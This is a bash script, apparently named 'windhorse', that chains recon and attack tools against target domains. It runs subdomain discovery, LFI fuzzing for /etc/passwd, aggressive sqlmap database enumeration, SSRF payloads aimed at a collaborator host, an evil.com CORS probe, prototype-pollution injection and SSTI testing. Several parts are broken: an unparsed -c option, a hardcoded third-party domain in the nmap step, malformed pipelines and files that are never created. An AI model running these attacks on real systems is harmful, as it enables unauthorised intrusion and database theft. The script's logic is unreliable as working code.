#!/bin/bash

# Configuration variables
aquatoneThreads=5
subdomainThreads=10
dirsearchThreads=50
dirsearchWordlist=~/tools/dirsearch/db/dicc.txt
massdnsWordlist=~/tools/SecLists/Discovery/DNS/clean-jhaddix-dns.txt
chromiumPath=/usr/bin/chromium
toolbox="$HOME/toolbox"

# Colors for output
green='\033[0;32m'
yellow='\033[1;33m'
red='\033[0;31m'
reset='\033[0m'
NC='\033[0m'

# Help function
usage() {
    echo -e "${green}Usage:${reset}"
    echo "  -h/--help                Show help"
    echo "  -p <project_name>        Specify project name"
    echo "  -d <domain>              Specify a single domain"
    echo "  -c <colaboretor_server>  Specify a remote server address / Burp Colaboretor Address"
    echo "  -l <domain_list>         Specify a file containing domain list"
    echo "  -o <output_dir>          Specify output directory"
    echo
    echo -e "${green}Examples:${reset}"
    echo "  windhorse -d example.com -p example_red_team_recon -o /home/user/Desktop/Example/"
    echo "  windhorse -l /path/to/domainlist.txt -p example_project -o /home/user/Desktop/Example/"
}

# Subdomain enumeration
subdomain_enum() {
    echo "${GREEN}---------------------Starting Subdomain Enumeration---------------------\n\n"
    echo "${NC}\n"
    domain=$1
    temp_dir="$local_dir/$Project/temp/subdomains/$domain"
    mkdir -p "$temp_dir"
    mkdir -p "$local_dir/$Project/$domain"

    echo -e "${green}Starting subdomain enumeration for $domain...${reset}"
    sublist3r -d "$domain" -o "$temp_dir/sublist3r_temp_subdomains.txt" 2>/dev/null
    subfinder -d "$domain" -o "$temp_dir/subfinder_temp_subdomains.txt" 2>/dev/null
    assetfinder --subs-only "$domain" >> "$temp_dir/assetfinder_temp_subdomains.txt" 2>/dev/null
    curl -s "https://api.certspotter.com/v1/issuances?domain=$domain" | jq '.[].dns_names[]' | sed 's/\"//g; s/\*\.//g' | sort -u | grep "$domain" >> "$temp_dir/certspotter_temp_subdomains.txt"

    # Consolidate results
    cat "$temp_dir/"*_temp_subdomains.txt | sort -u > "$temp_dir/$domain_subdomains.txt"
    cp "$temp_dir/$domain_subdomains.txt" "$local_dir/$Project/$domain/subdomains.txt"
}

# Check live domains
live_domain() {
    echo "${GREEN}---------------------Finding Live Subdomains--------------------\n\n"
    echo"${NC}\n"
    domain=$1
    temp_dir="$local_dir/$Project/temp/hostalive/$domain"
    mkdir -p "$temp_dir"

    echo -e "${green}Probing live hosts for $domain...${reset}"
    cat "$local_dir/$Project/$domain/subdomains.txt" | httprobe -c 50 -t 3000 > "$temp_dir/live_subdomains.txt"

    # Consolidate live subdomains
    sort -u "$temp_dir/live_subdomains.txt" | sed 's/http[s]*:\/\///g' > "$local_dir/$Project/$domain/live-subdomains.txt"
    echo -e "${yellow}Found $(wc -l < "$local_dir/$Project/$domain/live-subdomains.txt") live subdomains.${reset}"
}

# Aquatone snapshot
snapshot() {
    domain=$1
    echo "${GREEN}---------------------Start Taking Snap Shots---------------------\n"
    echo "${NC}\n"
    cat "$local_dir/$Project/$domain/live-subdomains.txt" | aquatone -out "$local_dir/$Project/$domain/snapshot" -silent
}

# URL scraping
url_scrap() {
    echo "${GREEN}---------------------Starting URL Scrapping---------------------\n"
    echo "${NC}\n"
    domain=$1
    temp_dir="$local_dir/$Project/temp/urls/$domain"
    mkdir -p "$temp_dir"
    mkdir -p "$local_dir/$Project/$domain/urls"

    echo -e "${green}Scraping URLs for $domain using waybackurls...${reset}"
    cat "$local_dir/$Project/$domain/live-subdomains.txt" | (gau || hakrawler || waybackurls || katana) |  sort | uniq > "$temp_dir/waybackurls.txt"
    cp "$temp_dir/waybackurls.txt" "$local_dir/$Project/$domain/urls/"

    # Extract specific URLs
    sort -u "$temp_dir/waybackurls.txt" | unfurl --unique keys > "$temp_dir/paramlist.txt"
    sort -u "$temp_dir/waybackurls.txt" | grep -P "\w+\.js(\?|$)" > "$temp_dir/jsurls.txt"
    sort -u "$temp_dir/waybackurls.txt" | grep -P "\w+\.php(\?|$)" > "$temp_dir/phpurls.txt"
    sort -u "$temp_dir/waybackurls.txt" | grep -P "\w+\.aspx(\?|$)" > "$temp_dir/aspxurls.txt"
    sort -u "$temp_dir/waybackurls.txt" | grep -P "\w+\.jsp(\?|$)" > "$temp_dir/jspurls.txt"
    echo -e "${green}Saved extracted URLs to respective files.${reset}"
}

# Run other tools
other_tools() {
    echo "${GREEN}---------------------Starting Enumuration With ReconTFW, SubDomz, Nmap Automator Scan---------------------\n"
    echo "${NC}\n"
    domain=$1
    mkdir -p "$local_dir/$Project/$domain/reconftw"
    mkdir -p "$local_dir/$Project/$domain/subdomz"
    mkdir -p "$local_dir/$Project/$domain/nmap"

    echo -e "${green}Running additional tools for $domain...${reset}"
    bash "$HOME/toolbox/recontfw/reconftw.sh" -d "$domain" -r --deep -o "$local_dir/$Project/$domain/reconftw"
    bash "$HOME/toolbox/SubDomz/SubDomz.sh" -d "$domain" -o "$local_dir/$Project/$domain/subdomz"
    bash "$HOME/toolbox/nmapAutomator/nmapAutomator.sh" -H rootniklabs.com -t All -o "$local_dir/$Project/$domain/nmap"
}

# Vulnerability Scanning
# XSS Testing
vuln() {
    echo "${GREEN}---------------------Starting Vulnerability Scanning Scan---------------------\n"
    echo "${NC}\n"
    echo -e "${green}Finding Possible Vulnerabilities $domain...${reset}"
    domain=$1
    temp_dir="$local_dir/$Project/temp/urls/$domain"
    temp_vuln="$local_dir/$Project/temp/vuln/$domain"
    mkdir -p $temp_vuln

    #Specific wordlist creation
    cat "$temp_dir/waybackurls.txt" | gf lfi > "$temp_dir/lfi.txt"
    cat "$temp_dir/waybackurls.txt" | gf ssrf | qsreplace "$colaboretor_server" > "$temp_dir/ssrf.txt"
    cat "$temp_dir/waybackurls.txt" | gf redirect > "$temp_dir/redirect.txt"
    cat "$temp_dir/waybackurls.txt" | gf rce > "$temp_dir/rce.txt"
    cat "$temp_dir/waybackurls.txt" | gf idor > "$temp_dir/idor.txt"
    cat "$temp_dir/waybackurls.txt" | gf sqli > "$temp_dir/sqli.txt"
    cat "$temp_dir/waybackurls.txt" | gf ssti > "$temp_dir/ssti.txt"
    cat "$temp_dir/waybackurls.txt" | gf xss > "$temp_dir/xss.txt"

    # xss
    cat "$temp_dir/xss.txt" | dalfox pipe > "$local_dir/$Project/$domain/temp_xss.txt"
    cat "$temp_dir/xss.txt" | dalfox pipe -o  "$local_dir/$Project/$domain/xss_results.txt"

    # LFI - Local File Inclusion
    cat "$temp_dir/waybackurls.txt" | grep "=" |  httpx -silent -path "$HOME/toolbox/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt" -threads 100 -random-agent -x GET,POST -status-code -follow-redirects -mc 200 -mr "root:[x*]:0:0:" >>$local_dir/$Project/$domain/LFI_results.txt
    cat "$temp_dir/lfi.txt" | httpx -silent -path /home/kali/toolbox/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -threads 100 -random-agent -x GET,POST -status-code -follow-redirects -mc 200 -mr "root:[x*]:0:0:" >> $local_dir/$Project/$domain/LFI_results.txt

    # SSRF Testing
    httpx -silent -l "$temp_dir/tmp-ssrf.txt" -fr | grep -o '\[[^]]\+\]' >>  $local_dir/$Project/$domain/SSRF_results.txt

    # SQLi
    sqlmap -m tmp-sqli.txt --batch --random-agent --level 5 --risk 3 --dbs >> "$temp_vuln/temp_sqli.txt" && grep -A3  "available databases \[" $temp_vuln/temp_sqli.txt | grep "\[\*\]" >> "$temp_dir/SQLi.txt"

    # CORS
    cat cat "$temp_dir/waybackurls.txt" | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done | grep "Potentional CORS Found" >> "$temp_dir/Cors.txt"

    #Prototype Polution
    cat "$local_dir/$Project/$domain/live-subdomains.txt"| anew "$temp_vuln/temp_prototype.txt"  && sed 's/$/\/?__proto__[testparam]=exploit\//' "$temp_vuln/temp_prototype.txt" | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE" >> "$temp_dir/Protype-polution.txt"
 
    # SSTI
    for url in $(cat "$temp_dir/waybackurls.txt"); do python3 tplmap.py -u $url; print $url; done >> "$temp_dir/template-injection.txt"

}


# Main function
main() {
    while getopts ":p:d:l:o:h" opt; do
        case $opt in
            p) Project=$OPTARG ;;
            d) single_domain=$OPTARG ;;
            l) domain_list=$OPTARG ;;
            o) local_dir=$OPTARG ;;
            c) colaboretor_server=$OPTARG ;;
            h) usage; exit ;;
            *) echo "Invalid option"; usage; exit 1 ;;
        esac
    done

    if [[ -z $Project || -z $local_dir ]]; then
        echo -e "${red}Error: Project name and output directory are required!${reset}"
        usage
        exit 1
    fi

    mkdir -p "$local_dir/$Project/temp"
    mkdir -p "$local_dir/$Project"

    if [[ -n $single_domain ]]; then
        subdomain_enum "$single_domain"
        live_domain "$single_domain"
        snapshot "$single_domain"
        url_scrap "$single_domain"
        vuln "$single_domain"
        other_tools "$single_domain"
    elif [[ -n $domain_list ]]; then
        while IFS= read -r domain; do
            subdomain_enum "$domain"
            live_domain "$domain"
            snapshot "$domain"
            url_scrap "$domain"
            vuln "$domain"
            other_tools "$domain"
        done < "$domain_list"
    else
        echo -e "${red}Please provide a domain or a domain list.${reset}"
        usage
        exit 1
    fi
}

main "$@"
